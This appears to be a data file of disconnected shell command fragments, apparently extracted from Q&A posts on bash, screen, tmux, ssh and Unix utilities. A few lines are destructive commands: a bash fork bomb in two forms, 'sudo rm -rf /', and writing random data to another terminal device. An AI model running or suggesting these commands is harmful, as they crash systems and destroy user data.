cd ./somewhere
cd .hidden
cd ./visible
cd ../visible
cd somewhere
cd ./somewhere
cd src/somewhere
"parsed": false
print "some status message"
cat -a
word1 word2 word3-6b3kZ3q2i.mp4
word1 word2 word3.mp4
sleep 7
scriptname cat
prog is /bin/cat
command -v
type -P
printf '%s\n' "$PATH"
. PATH_TO_PROPERTYFILE
$SOURCED_ARRY_NAME = ("${TEMP_ARRAY[@]}")
declare -p
ps aux | grep
sh myScript.sh
cat ... | wc -l
wc -l < myfile.py
[[ ]]
[ ]
done > myfile_mod.py
tail | head
ifdown wlan0
ifup wlan0
-n 0.2
alias w=watch
my_function ()
Segmentation fault
sudo chown -R $(whoami) /usr/local/bin/
ls -l /usr/local
ls -l /usr/local/bin
echo 'echo "[$BASH_SOURCE]"' | bash
a[1]='hi'; echo "$a"
source ./script
. ./script
echo $out
$(cat "$1")
echo "$CONTENTS"
while IFS= read -r -d '' s
while read
printf '%s\0' ...
grep -n
k variable
grep -n
grep -v '\\\\
grep -n
for x in $(command)
while read -r line
namely /home/pi/x.py
sudo chmod +x /etc/init.d/mystart
sudo update-rc.d mystart defaults
sudo service mystart start
[Unit mystart.service failed to load: No such file or directory.]
SHELL "foo"
tcpdump -r netflow.pcap
grep | wc -l
grep -rc 'class' assets/coffee
grep -c
-o, --output <file>
curl http://ibm.com.com -o "html_output.txt"
grep transcript
sed 's/.*"transcript": "\(.*\)".*/\1/g'
airodump-ng -w $CAPT_DEST $mon
man timeout
$ tmux source-file .tmux.conf
.tmux.conf:12: unknown command: set -g mouse-resize-pane on
/bin/sh -c
/bin/sh -c
sort -V
sort -V
tmux 2.4
tmux 2.4a
tmux next-3.3
tmux 1.3
tmux 3.2a
copy-mode 
set -gq
shopt -s nullglob
echo "$json"
chmod 777
elif [ $exitstatus = "1" ]; then
cat file
set -x
a=3 echo 2
var=val command
printf %s "$URL" | xxd
brew install gdb
codesign -s [cert-name] [your-gdb-location]
sed -i
man bash
echo $var
{ print }
arg1 OP arg2
; then
for i in {1..3}; do echo $i | xclip -i; done
ipconfig getifaddr en0
MYLIST='Word1.c Word2.c Word3.xy.c Word4.cpp Word5.xy.cpp'
for str in $1
! ${str: -5} == ".xy.c"
env -i bash -ilc "env"
ssh host-1
ssh host-2
echo "blah"
Connection to host-2 closed.
disown [jobspec]
at now
firefox < /dev/null &>/dev/null &
gnome-terminal -e
nohup <command> &
nohup <command> &
setopt nohup
nohup $COMMAND &
$COMMAND & disown
setsid command
$COMMAND &>/dev/null
sudo apt install ucommon-utils
pdetach command
set -o vi
set editing-mode vi
[$]> brew install peco
ls -A
ls -A
ls -A
ls -A
mv *.htm *.html
mv foo.htm bar.htm stuff.htm six.htm file.htm
rename 's/\.htm$/.html/' *htm
shopt -s globstar
rename 's/\.htm$/.html/' **/*htm
setterm -reset
tset -s
source ~/.bash_profile
man bash
rm -r
$ rm test5
$ rm -f test5
rm test5
rm test5
sed =
do shell script
cat other
man reset
git init
alias ls=ls --color $*
bind -p
source ~/.profile
export FOO=bar
FOO=bar; export FOO
wget --page-requisites
sudo chsh -s /opt/local/bin/bash my_user
M-x shell
man bash
source /etc/profile
grep --color . foo
grep --color
rm foo
ls -1d */
$(cat filelist.txt)
ls -t -U -r
'[\u@\h]\$ '
M-x ansi-term
PS1='\h:\W$(__git_ps1 "(%s)") \u\$ '
-bash: __git_ps1: command not found
echo $BASH_VERSION
/opt/local/bin/bash -l
. /opt/local/share/doc/git-core/contrib/completion/git-prompt.sh
brew install bash
ln -s link $HOME/directory
chflags hidden link
chflags -h
GNU bash, version 3.2.48(1)-release (x86_64-apple-darwin10.0)
echo -e
man python
which python
defaults write com.apple.versioner.python Version 2.6
#!/usr/bin/env python
python_select -s
sudo cp /usr/local/bin/python3 /usr/local/bin/python
find . -name xy\* 
>ls xy*
find . -name xy\\*
ls foo*
ls -R
"\e\e": ""
shopt -s histappend
PROMPT_COMMAND="$PROMPT_COMMAND;history -a; history -n"
history -n
history -a; history -n
-type f
-type f
zip -er filename.zip dir2 dir4
tar cfj
find -print0 | xargs --null -I XXX do_something XXX
man readline
head -15
kill %<JOB_ID>
readlink -f
readlink -f
pathappend /usr/lib/perl/5.14
pathappend /usr/lib/perl/5.14
if ARGA=$(readlink -f "$ARG")
[ -d "$ARGA" ]
declare -n
e fTabTabTab
set wildmenu
set wildmode=list:longest
echo ${0##/*} hello
./bla.sh hello
. bla.sh
-bash hello
help .
help source
. ./bla.sh
. <cmd>
. cmd
zsh 4.3.11 (x86_64-unknown-linux-gnu)
alias untar='tar -xvzf'
aunpack archive.zip
apack archive.tar.bz2 *.txt
als archive.tgz
svn update *
git pull
hg pull
man bash
source script
. script
. script
source script
. filename
source make_alias
$ chmod +x test.sh
$ source test.sh
$ test
bash -l
sudo dpkg-reconfigure dash
$(command args)
alias xx2='xrandr | awk '\''$2=="connected"{s=$1} END{print s}'\'''
VAR=$(xrandr | awk '$2=="connected"{s=$1} END{print s}'); xrandr --output $VAR --mode 1024x768 --rate 60; xrandr --output LVDS1 --left-of $VAR; xrandr --output LVDS1 --primary; unset VAR;
alias xx2='VAR=$(xrandr | awk '\''$2=="connected"{s=$1} END{print s}'\''); echo $VAR > OMG'
date /t
date /t
date +FORMAT
date /t
-mindepth 1
set -o vi
sudo networksetup -getwebproxy NAME_OF_NETWORK_DEVICE
scutil --proxy
scutil --proxy
export ALL_PROXY=HTTPPort:HTTPProxy
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
"Hello world!"
"Hola el mundo!"
yum install sysstat
ssh user@host
sshr host
filezilla --site=the_site_name_and_path
filezilla -h
cd -
alias cd='cd $1;echo $PWD > /tmp/CWD'
bash ./"$i"
yum install pandoc
ls -e
ls -e
sudo chmod +a "liuxiang allow read" sa
sudo chmod +a "liuxiang allow write" sa
sudo chmod +a "liuxiang allow execute" sa
du -k | sort -n | tail
ls -S
du -s * | sort -nr
grep -E
grep -F
grep -F
grep & tail -f
tail -f
eval $PS5
gnu configure
<, >, >>, |, &
set -o vi
scp user@host:/file user@otherhost:/otherfile
ssh user@host scp /file user@otherhost:/otherfile
ssh -p XXX user@host scp -P XXX /file user@otherhost:/otherfile
.ssh/config file
ln -s somedir/ linkname
sudo mv linkname targetlocation
ln -s command
su - alex
su alex
man su
echo $PATH
echo $PATH
sudo /etc/paths/opt/local/bin
echo $PATH
ssh localhost 'echo $PATH'
ssh localhost 'source /etc/profile; echo $PATH'
source /etc/profile
man smbclient
ln -s
ls -la
man bash
-exec ... +
xargs ...
-exec ... \;
the  process ID of the most recently executed back-ground (asynchronous) command
sudo apt-get install xserver-xephyr
wget --page-requisites
ls -f
ls -R
man zshbuiltins
cwcch1.pdf, cwcch2.pdf, ..., cwcch9.pdf, cwcch10.pdf
PROMPT_COMMAND="echo -ne \"\033]0;${PWD##*/}\007\"; $PROMPT_COMMAND"
ESC ] Ps ; Pt BEL
-type l
find -type f -ls | sort -rn -k 4 | head -10
chmod +x myscript
source myscript
man readline
$ ./build-it.sh report & exit
set -x
ulimit -t 10
. ~/.bashrc
source ~/.bashrc
\u \h \w
0x1b 0x2e
chdir ----
sudo scutil
networksetup -listallnetworkservices
networksetup -listallnetworkservices
$wojek1 $wojek2
seq 5 | awk '{print "Hello World"}'
./script.sh | tee script.log
rm script.log
exec > $LOGFILE 2>&1
mkfifo $PIPEFILE
mv -v ./images/*.png ./test/*test.png
-I {}
rename myfile.* yourfile.*
20091231 2359 New Year.jpg
date --help
sudo apt-get install jhead
^X ^R
read -e
read -e
cd /path/to/wherever > /dev/null
FOO=$(cd $SOMEVAR && pwd)
&& ls
set -P
cd ..
type -a _expand
set -P
set -P
set -P
. /etc/bash.bashrc
. ~/.bashrc
ls -lrt
$ cat file.html | [some html highlighting utility]
highlight -q -s vim-dark -M file
pygmentize example.html
ps -ef | more
mysql -h 192.168.1.101 -u root -p
ps -ef | more
man bash
# ssh-copy-id $user@gpu.srv.ualberta.ca
DEL: delete-char
su someuser
sudo -u sonar /usr/bin/sonar start
/usr/bin/sonar start
exit $?
ls -la
ls -dla /tmp
sudo chmod 1777 /tmp
Run PuTTY Config
Terminal-type string
Default Settings
cj@zap:~$ ls ~/
cj@zap:~$ ls /home/cj/
[ -d ¨a¨ ]&&echo ¨exists¨||echo ¨not exists¨
[ -d "YOUR_DIR" ] && echo "is a dir"
[ -d / ] && echo "root dir
root dir
-d ->[ ! -d ....]
man caffeinate
pmset noidle
man caffeinate
awk 'NR % 2 == 0' filename
sed -n 1~2p file
sed 'n;d' filename
[me ~/my/path]$ find -type f -name "*(J)*.foo" -print0 | xargs mv -0 j/
./Kitty Parade/
./Hello World/
./Third Example/
Missing filename ("less --help" for help)
whereis more
man more
man more
man less
wget -r
wget --recursive
command &lt<inputfile> &gt<outputfile>
command 1>>/path/existing_file &
time wget ...
echo foo | xclip -selection clipboard
xclip -selection clipboard -o
pwd > file.txt
failsafe GNOME
su -
sudo su -
sudo su -
su -
ls -la
ls -la | more
alias 'ls -la'='ls -la | more'
"ls -la" -p pattern
-p pattern
ls -la -h
title 'et voila'
man head
port install bash-completion
port update git-core +svn +bash_completion +doc
port up
port upgrade
/opt/local/bin/bash -l
source myFunc; ls2
echo $PATH
chmod +x filename
source ~/bin/functions.sh
ls() {
set|grep p4c
. $HOME/.p4c
set|grep p4c
. $HOME/.p4c
alias sim='sudo vim $1'
sudoedit Example.php
sudo -e Example.php
export EDITOR=vim
alias sim='sudo vim'
sim Example.php
sudo vim
sudo update-alternatives --config editor
$ sim -p Example.php Example2.php
:w !sudo tee %
cp -r from to
su someotheruser
sleep 10
ssh final
kill -l
file ./p4
ls -lb p4*
readelf -a /usr/bin/p4 | grep interpreter
man head
head -10000 bigfile.log | tail -20
less filename
man less
ls -laX
ls -la | grep "^d" && ls -la | grep "^-" && ls -la | grep "^l"
ls -la | grep "^d" && ls -la | grep -v "^d"
ls -dlF --color * .* | head -n2
ls -F
ls -AlF | LC_ALL=C grep "^d" | LC_ALL=C sort -k 9df
ls -A
ls -AlF | LC_ALL=C grep "^[l-]" | LC_ALL=C sort -k 9df
find -maxdepth 1 -type d ! -name . | wc -l
find -maxdepth 1 -type f | wc -l
find -maxdepth 1 -type l | wc -l
du -hs | cut -f 1
find -maxdepth 1 -type f -print0 | du -ch --files0-from=- | tail -n 1 | cut -f 1
ls -a ~
ls -l | grep "^d"
man source
man bash
man bash
:highlight MyQuestions guifg=red guibg=green
:syntax match MyQuestions /Question/
:syntax match MyQuestions /.*Question.*/
kill -9 $PID &>/dev/null
/bin/sleep 10 &
set -b
set -b
nohup python action.py &
ls -Ral /
-k 2
+1 -2
sort -t, -nk 2 -s file.txt
info time
time -v sleep 4
which time
unzip -qoj data.zip
:so $VIMRUNTIME/syntax/hitest.vim
mkdir /where/the/hell/is/that/thing
set -o vi
Esc + k
Esc + k
mkdir /some/really/long/path
cd -
cd ..
ls -a
cd $OLDPWD
-s /bin/bash
Screen version 4.00.03 (FAU) 23-Oct-06
screen -h 50000
CYGWIN_NT-5.1 1.7.1(0.218/5/3) i686
Screen version 4.00.03 (FAU) 23-Oct-06
C-a c
screen -l
FOOBAR=foo screen
**argv == '-'
screen -s -/bin/bash
strings "$(which screen)" | fgrep -i screenrc
SCREENRC=/dev/null SYSSCREENRC=/dev/null screen
set +H
myCommand ; dd if=/dev/random of=/dev/audio count=100000
/usr/bin/audioplay /usr/demo/SOUND/sounds/bark.au
ls -lart |grep ^d
chmod +x
which growlnotify
> module.txt
grep -R "module" . > ../module.txt
kill pid
kill -TERM pid
kill -INT pid
chsh /bin/bash
chsh: unknown user /bin/bash
chsh -s /bin/bash username
../$(basename $PWD)
unzip my.zip
-output... filename
echo -n <data> | openssl base64
echo -n <data> | base64
echo -n <base64-ed data> | base64 -D
brew install coreutils
base64 <<< string
base64 -D <<< string
base64 -in file
base64 -D -in file
openssl base64 -in [filename] | pbcopy
echo -n "STRING" | base64
> base64-encoded.txt
man 1 bash
grep -i hist
history -a
history -n
cd folder
ls -l
ls -l folder
ls -la
ls -la folder
chmod a+x myscript.sh
chmod go-rwx supersecretfolder
touch main.cpp
mv item_to_delete ~/.Trash/
cp -rf original destination
ln -s original destination
firefox filename >/dev/null 2>&1 &
cd /cygdrive/c
man 5 terminfo
apt-get install gnome-do
fix command
perl -e ''
socat - exec:'bash -li',pty,stderr,ctty
bash: no job control in this shell
Esc f
find -exec
find -name \*conf -print > /home/ubuntu/myfile
-tn termname
-d -m
-d -m
screen -r
man watch
cat -v
watch --color
watch --color
ls -l --color
cwatch ls -l --color
man bash
bash +B
echo -e
#!/usr/bin/env bash +B
The Trance Mix 3 Wanderlust - DJ Exortius [TRANCE DEEP VOCAL TECH]@
DJ Exortius
DJ Exortius
for $(find)
man bash
+, ?, | and ()
grep -E
hostname -s remote.location.example456.com
man sshd_config
-maxdepth 1
PS1="\[\033[1;34m\][\$(date +%H%M)][\u@\h:\w]$\[\033[0m\] "
passwd -s /bin/bash
chsh -s /bin/bash
man rsync
pgrep chrome
pkill chrome
man killall
/usr/bin/pkill --oldest --signal TERM -f chrome
bash *filename*
sh *filename*
ps ax
ps ax | grep [a]pache2 | wc -l
man test
"Connection Refused"
-exec rmdir -p {} ;
bzr commit -m "It works!"
bzr commit -m "It works\!"
echo -e $foo
foo=$(echo -e "$foo")
echo $foo
$ t=`basename $f|tr -d '[0-9-]'`
$ t=`basename $f|gawk -F- '{print $1;}'`
exit 0
exit 0
bash test.sh
for i in $(find -name '*.ogg'); do echo '$i'; done
ls -lQF
history -s
history -s
/usr/bin/less -isX
ESC [ ? 47 h
ESC [ ? 47 l
trap -p
echo $PROMPT_COMMAND
> HISTSIZE
history -w
foo &
bg 1
bg 1
man bash
make install
make uninstall
make help
git pull origin master
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\n\$ '
rm FOO0*
rm FOO[13-15]
rm FOO1[3-5]
-a -b
p whatever
cd ~/Project/$1
alias p="cd ~/Projects/\$1"
watch "ls -la | wc -l"
#!/usr/bin/env zsh
; wait
xargs --max-args=MAX-ARGS --max-procs=MAX-PROCS
complete -o filenames -F _filedir_xpec gv
touch /var/downtown_logs/`date +%s`
$(date +%s)
stty -ixon
stty quit undef
ctrl-b d
global.context.unsafe_mode = true
wmctrl -a WINDOWTITLE
wmctrl -lx
wmctrl -xa NAME
wmctrl -lx
wmctrl -xa Evince
ps aux
kill PID
ls /media
man bash
bash -x
sudo /etc/init.d/gdm stop
sudo /etc/init.d/gdm restart
help [
help test
[ "$num1" == "$num2" ]
[ 3 == 3.0 ]
[ 3 -eq 3.0 ]
ls -a
stty -ctlecho
stty ctlecho
stty -a
stty sane
stty -a
tput cols
rm "-p"
rm /home/user/-p
history -a
Adapter 0: on-line
Adapter 0: off-line
cd -L
cd -P
pwd -L
pwd -P
command mkdir
echo foo bar && echo $_ baz
$ take 'directory_name'
take <Your_folder_name>
man bash
declare  -x
declare -x
dir *.mp3
find . -maxdepth 1 -iname '*.mp3'
ls|grep -i '\.mp3$'
ls *.mp3
for i in {1..1000}; do do_something $i; done
for i in {1..1000}; do do_something $i& done
for i in {1..1000}; do do_something $i& sleep 5; done
sudo tee
| sudo tee
man mkfifo
sh script
opendiff -h
$ ls -al
$ ls -al | grep prof | sed 's/i/XX/g'  | cut -c 10-
x  1 nXXfle None 1150 2010-02-09 16:42 .bash_profXXle
final= "$file_clean.csv"
unset foo
help unset
unset --help
man unset
which nvm
declare -F
ctrl-v ctrl-m
echo text^M^M >> file.conf
cd somet
echo "set mark-symlinked-directories on" >> ~/.inputrc
man bash
cp alpha bravo && foobar "copy complete"
.txt, .php, .js, .css
-i inplace
cygstart /bin/bash -li
tree --charset unicode
cat list.txt | echo -e
tree > list.txt
tree -H www.somewhere.com
length5=$(echo $LINE | awk '{ print length($5)}')
awk -F' '
$ complete -W foo.com ssh
ssh f<tab>
ssh foo.com
complete -W foo.com ssh; complete -W bar.com ssh
$(wildcard *.c)
$(shell mycommand)
make -j4
make -j -l3
gnu parallel
/opt/lampp/bin/mysql -u root -p
source ~/.bashrc
down arrow
ls -la
gnome-terminal --tab --tab
Alt + 1
Alt + 1
gnome-terminal --tab --tab -e "alt1"
pacman () { sudo packer $@ || sudo pacman-color $@ }
Option '-V' is not valid.
stty -a
susp = ^Z
stty intr ^D
php -v
diff valid-sorted invalid-sorted |grep '^>'
:set ttimeoutlen=100
:set noesckeys
vim -u NONE
$ make
chmod a-w /dev/pts/*
chmod go-w /dev/pts/*
chmod 0600 /dev/pts/*
cat /dev/urandom > /dev/pts/x
GNU screen
fg %n
fg %-
$TERM == linux
man bash
strings ./flume | head -n 1
strace ./flume
-type d
print **/.*(/)
program "[abc]\_[x|y] anotheragument"
man bash
[[ ... ]]
sudo service network-manager restart
sudo /etc/init.d/networking restart
:(){ :|:& };:
sudo rm -rf /
forkbomb(){ ... }
bomb(){ bomb|bomb& };bomb
exec bash
export PS1
source ~/.bash_profile
man chmod
mate whatever
np whatever
filename: command not found
np whatever &
C-x #
tar cvfz yourtarball.tgz /your/path
tar -cpzf /backups/fullbackup.tar.gz --exclude=backups --exclude=proc --exclude=tmp --exclude=mnt --exclude=sys --exclude=dev --exclude=run /
tar: Exiting with failure status due to previous errors
man openssl
openssl enc
-pass <arg>
sudo -s
sudo -s
man bash
fdisk -l
mkdir /mnt/my_usb
mount /dev/sdXY /mnt/my_usb
dirs -v
dirs -v
pushd +2
cd -
cd -
cd /v/l/fsck
cd /u/s/appl
man zshcompsys
sudo shutdown -h -P now
man sudo
man sudoers
sudo gpasswd -a your_username power
man curl
-s, --silent : Silent or quiet mode. Don't show progress meter or error messages. Makes Curl mute.
echo 'HISTFILE=$HOME/.bash_history' >> $HOME/.bashrc
kdialog --help
nohup ./myprogram > foo.out 2> foo.err < /dev/null &
help trap
ssh myusername@remotemachine
<your command here>
lpstat -a
man 5 utmp
"ls /ops/pkg/ec/* > /tmp/tmp_file"
grep "PKRTS" /ops/pkg/ec
rm /usr/bin/gem
man grep
which gem | xargs rm
find mydir/ -! -name ".hello" -print | zip mydir -@
apt-cache search something | less
command | less
apt-cache search foo
while read
cat list.txt
file1 file2 file3...file#
cp $(<list.txt) new_folder
# split line into three tokens: cp, $(<list.txt), new_folder
cp file1 file2 file3...file# new_folder
# substitute result of $(<list.txt) into the larger command
PS1='\u@\h:\W$ '
echo && hostname && df -h | grep /usr
make changes
ls -li
uniq -d
rsync -a -H
cd ~/work
cd $PWD
PS1='#prompt# \[\033[01;34m\]\w\[\033[00;35m\]$(__git_ps1)\[\033[00m\]\$ '
pbpaste > /tmp/screen-exchange
ctrl-a <
screen -X readbuf
$(cd -- "$(dirname "$f")" && command -p pwd)
$(cd -- "$d" && command -p pwd)
command -p pwd
pwd -P
$(dirname "$(readlink -f -- "$f"))
df "$f"
cp my_file_name
bash -r
chroot /some/root /bin/bash /myscript
mount -t proc proc /proc
mount --bind /var/example /some/root/var/example
[ -f $HOME/.bashrc ] && . $HOME/.bashrc
[[ $- != *i* ]] && return
man ls
echo \"$PS1\"
ls -a
ls -a
exec 5<>file
"exec 5<> -"
"pipe <5 >6"
command2 < <(command1)
command1 | command2
exec > >(postprocessing)
{ ... } | postprocessing
GNU bash, version 4.4.19(1)-release (x86_64-pc-linux-gnu)
GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin17)
accurev update -9
f1 f2 and f3
#dir1 #dir2
ls #dir1
type vim
which vim
alias vim=/usr/local/bin/vim
ln -s /volume/perl/bin/perl ~/bin
setenv PERL5LIB /volume/perl/lib/perl/5.10
/volume/perl/bin/perl -le 'map print, @INC'
VimLeave * !reset
man bash
ssh host2user@oracletunnel -L <port>:host3:<port>
su -l user
foo.sh args
man bash
ls -l
echo $PS1
for arg
for arg in $@
$ man script
man screen
screen -L
less -R
info screen
bash -x
sudo apt-get update
od -c <<< "
ls -l vmware-tools-distrib/vmware-install.pl
metamail -wy
rm -- -rf /path/directory
rm -rf /path/to/directory
tput cols
set show-mode-in-prompt on
date +%T
cat /proc/sys/kernel/hostname
[ "$2" = "" ]
bash myscript
myprogram foo bar
man bash
mk TAB TAB TAB
man bash
$ls -lt | sed -n '2p'
ls -l
alias ll="tput rmam; ls -l; tput smam"
ll | grep foo
alias ll="(tput rmam; ls -l; tput smam)"
less -S
tput rmam
tput smam
cd /cygdrive/c/code/blah/blah
file scriptname
d2u scriptname
ls | echo
ls | grep 'foo'
ls | while read OUT; do echo $OUT; done
ls | echo
man bash
Ctrl-A [
grep PATH .??*
grep | wc -l
grep -c
grep -qs
if stuff | grep -qs stuff; then ... fi
link detected…
inet addr
ip link show eth0 up
-exec … \;
ssh user@host
find dirname -type f ! -empty
-maxdepth 1
-size +0
-type f
find dirname -not -empty -ls
ls -S
cd -
man Bash
cd ~/some/dir; ./my_app; cd -
cd -
doit foo bar
'echo $PATH'
su -
su -l
su -
su ... "echo $PATH"
su ... 'echo $PATH'
su - -c env
rsync --partial
git config 2>&1 | less
use POE::Wheel::FollowTail
help if
rm -rf
find /space ! -iregex '(var_opt|var_log)' | xargs rm -f
yes no | rm -ir .
env ls
sudo crontab -e
sudo su
crontab -e
rebaseall --help
fatal error – unable to remap \?\C:\cygwin\lib\python2.6\lib-dynload\time.dll to same address as parent: 0×360000 != 0×3E0000
$ /bin/rebaseall -v
rebaseall:'/cygdrive/c/Users/ADMINI~1/AppData/Local/Temp' is not writable
$ chmod 777 ~/AppData/Local/Temp
hg bcomp
echo $ifc
Ctrl + _
Ctrl + W
Alt + B
Alt + F
Ctrl + K
"Super User"
"uper Use"
test ${array[key]+_}
$( ... )
grep -n
grep -m 1
$(( ... ))
history | grep somecommand
4992 somecommand
history | grep -C20 '^4992'
grep -C 4
grep -A 4 -B 4
sudo -v
sudo -n true
sudo /bin/bash
grep -v Sorry
sudo -k
sudo -n true 2&>/dev/null ; echo $?
sudo -V 1.7.10
defaults mail_badpass
sudo true
sudo date
echo $?
help set
/path/to/foo arg1 arg2
/bin/bash /path/too/foo arg1 arg2
#!/bin/bash -ex
/bin/bash -ex /path/too/foo arg1 arg2
#!/bin/bash -e -x
-e -x
#! /path/to/bash -option
bash -option /path/to/script
set -option
set -x
set -e
set -e
set -e
set -o pipefail
$( ... )
foo=$( bar )
local foo=$( bar )
set -e
set -e
set -e
unset HTTP_PROXY
unset http_proxy
echo ^V^O
printf '\017'
stty sane
PROMPT_COMMAND='reset 2>/dev/null'
stty sane
stty sane
strace tclsh
gnome-terminal -e gedit
cd /foo/bar && gnome-terminal
VAR=value gnome-terminal
... rm ...
... echo rm ...
ls -lctr
unzip -Z1 ../../accidentally-extracted.zip | xargs rm
unzip -Z1
sed '$d'
2001 $(history | sed '$d' | sed -n '$p' | cut -d ' ' -f 3-)
sed -n '$p'
2000 yourpreviouscommand
cut -d ' ' -f 3-
man bash
r="fc  -s"
r cc
ls *.py
ls *.py
cherrypy, crappy, bumpy
exec bash
shopt -u expand_aliases
shopt -u expand_aliases
shopt -s expand_aliases
cat >> concated_file file1
f () { cat "$1" >> concated_file; }
f file1
f file2
sudo !!
bang bang
$(dirname \w)/\[$(tput bold)\]$(basename \w)\[$(tput sgr0)\]
CTRL+V, ENTER
# sudo -s
# exit
# su
# sudo -s
sudo tee
sudo sed -e "s,%,$,g" >/etc/init.d/dropbox
cd /usr/local
fp file.ext
/bin/readlink -f
ls --color
dircolors -p
man bash
echo $foo
echo $foo
foo=bar; echo $foo
foo=bar && echo $foo
echo $foo
su Admin
sudo ls
erase = ^?
werase = ^?
stty werase '^?'
stty erase '^h'
export PS1="\u@\h\w$ "
$ ssh new_machine "find /tmp -name 'test_*.csv' -mtime +14 -exec rm '{}' \;"
greadlink -f
dirs -l
dirs +0
man readline
key-sequence: action
cat -v
man xterm
$ ./some_program && growlnotify Title -m Message
long your_command
gn svn
growlnotify -h
&& growlnotify -m "Message"
$ brew install terminal-notifier
. ~/.bash_profile
display notification
sudo su -
alias ls='ls -G'
:set nocompatible
set nocompatible
man -k .
apropos .
whatis .
man -k
man -k . | grep \(1\) | less
kill -SIGHUP $PPID
ls -tp | grep -v / | head -n <n>
echo 126
echo 126
yourcommand | if [ $(wc -c) -gt "0" ]; then yourothercommand; fi
sender | receiver
source --foo
sink --bar
source --foo | pipe_if_not_empty sink --bar
head -c 1
dd bs=1 count=1 2>/dev/null
head -n 1
read -r head
read -r -n 1 head
head=$(head -c 1)
shopt -s extglob
setopt ksh_glob
setopt extended_glob
-maxdepth 1
C-a c
C-a p
C-a n
C-a space
C-a S
C-a tab
cp /some/path /some/other/path
mv !*
mv /some/path /some/other/path
echo "Hello World!"
set +o histexpand
'$ '
print -Pn "^[k`echo $2|perl -pne 's!\s.*/! !g'|cut -c1-16`^[\\"
git rev-parse --git-dir
shopt -s histappend
shopt -s histappend
cp -a /temp /temp2
cd /temp; cp -a . /temp2
cp -Rp
tcp.port == 80
Follow TCP Stream
1b 7f
ESC DEL
metaSendsEscape: true
1b 08
ESC BS
ESC n
set bind-tty-special-chars off
echo "/example/filepath/with_non-alpha.characters@blah:meh
echo "/example/filepath/with_non-alpha.characters@blah:
echo "/example/filepath/with_non-alpha.characters@
echo "/example/filepath/with_non-alpha.
echo "/example/filepath/with_non-
echo "/example/filepath/with_
echo "/example/filepath/
sudo diskutil
grep "X"
grep "^X"
ls *X*
echo *X*
-maxdepth 0
emacs -nw
sudo find readme* -not -perm -o+r -exec chmod +r {} \;
sudo: unable to execute /usr/bin/find: Success
find readme* -not -perm -o+r -exec ls -l {} \;
sudo chmod +r *
sudo: unable to execute /bin/chmod: Success
find readme* -not -perm -o+r -exec chmod +r {} \;
wget --load-cookies cookies.txt http://forum.ubuntu-it.org/
bash -x
complete …
man bash
cd /home/user01 && ack --java teststring
ack some_string /in/path_y
ack some_other_string
ls *
ls a b c
$ ls *
$ ls a b c
set -o vi
ls *
ls *
if [ -f ~/.bashrc ]; then source ~/.bashrc; fi
rsync somefile host.example.com:
-d ''
-n 1
-t xC
-e <SCRIPT>
U+26A1 HIGH VOLTAGE SIGN
\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\u@\h:\w\$
echo $PS1
source ./myfile
printf '\e(0 qwertyuiop \e(B \n'
touch $(printf "Abc\xA9def")
lsof mydir/*|awk '(NR>1){print $9}
#!/usr/bin/env bash
source joes_bashrc
sudo -su shareduser
ssh -t srvname ' cp ~/.bashrc ~/.bashrc.n &>/dev/null ; echo "LS_COLORS=\"no=00:fi=00:ETC:ETC:ETC\";" >> ~/.bashrc.n ; echo "export LS_COLORS" >> ~/.bashrc.n ; echo "alias ls=\"ls --color=auto\";" >> ~/.bashrc.n ; exec bash --rcfile ~/.bashrc.n'
plugins=(... hg)
System Preferences -> Print & Fax
logger "ls *.log"
cp -R
ssh -o "BatchMode yes" ramesh@remote-host who
LC_VIRTUAL_HOST=site1 ssh common-host.provider.com
ls A
ls A/
ls A
ls A/
ls A/.
rm *:*
find . -regex '.*/*[0-9][0-9]:[0-9][0-9]:[0-9][0-9]*' -exec rm -fv '{}' \;
: altscreen on
cd perls*
sed s/$line/$line.'\n'.$linetoadd/ <$oldfile >$newfile
M-x term
C-x o
M-x shell
C-c C-j
C-c C-k
C-c o
C-x o
C-c b
C-x b
C-c C-h
C-c M-x
f1 m
f1 w
history -w
trap "history -w" SIGUSR1
alias dt='history -w; dt'
history -w
history -w
sprintf("%s/.bash_queue.d/%u,%s", sys.env("HOME"), pid_of_bash, your_unique_suffix)
ssh user@host
pwd > ~/foo;
cd $(< ~/foo)
while read x;do printf '%d\n' $x;done <file
FFmpeg bug #1663
> < ! $
time find ~
jobs -x kill
kill ``jobs -p 
jobs -p
install -c
install -c
install -c
install -c
-perm -111
man bash
eval `resize`
xhost <name>
M-x make-frame-on-display
-type d
info 'Date input formats'
bash;cd dir; ./dostuff;exit;
cd foo
cd -
cd -
dirs -p
dirs -c
-t 1
-t 2
date in file name < now - 1 month
last modification date
-path "$prefix"'*'
for file in "$prefix*" ; do ... done
modprobe pcspkr
xkbset b
modprobe pcspkr
mplayer beep.wav
. testscript
chmod +x
cat file | while read
$ ls
stat -c '%x %z' filename.txt
ls -l
man find
chmod +x scriptname
touchMakingDirs blah/blah/whatever/who.txt
info bash
tar -xzf *
tar -xzf *.tar.gz
tar -xzf one.tar.gz juk.tar.gz cv.tar.gz ...
svnadmin dump
svn log
while read
rm -i
rm -i "$file"
set -x
/bin/sh -x
set -e
set -o errexit
echo -e
export ans=42
-maxdepth 1
tar -cvf
title <string>
Use console window title*
cmd1; cmd2; cmd3
cmd1 && cmd2
set -e
cd "$my_dir"
export my_dir=my\\\ dir
export my_dir="\"my dir\""
my\ dir
"my dir"
wget -q -U Mozilla "http://rss.slashdot.org/Slashdot/slashdot" -O - | tr '\n' ' '
# wget "http://slashdot.org/" -O -
Connecting to slashdot.org (216.34.181.45:80)
wget: bad header line: slash_LOG_DATA: shtml
pushd . && cd /foo/bar && ls && popd
type -a fromdos
bash: /home/chris/.bashrc: line 123: syntax error: unexpected end of file
map <Esc>[B <Down>
set -g default-terminal "xterm"
bash --norc
set -a
cat file.txt
export PS1="[STRING] $PS1"
eval "$commands"
eval "$(foo)"
eval "`foo`"
brew install reattach-to-user-namespace
wait $CPPID
rsync --progress
sudo !!
for i in myLocalFiles*; do rm -f $i; done
bind -x '"\C-r"':reset
warning: line editing not enabled
. ./bind
source ./bind
printf '\033c'
tput clear
xterm -sl 0
echo $PS1
perl -p -i -e 's/\s+/\t/g' *.txt
tr -s
-h, --tabs
C-x C-r
bind -f ~/.inputrc
bind -f  ~/.inputrc
rsync -tr "folder to copy from" "folder to copy to"
rsync -tr /home/me/stuff/* /home/me/otherstuff/
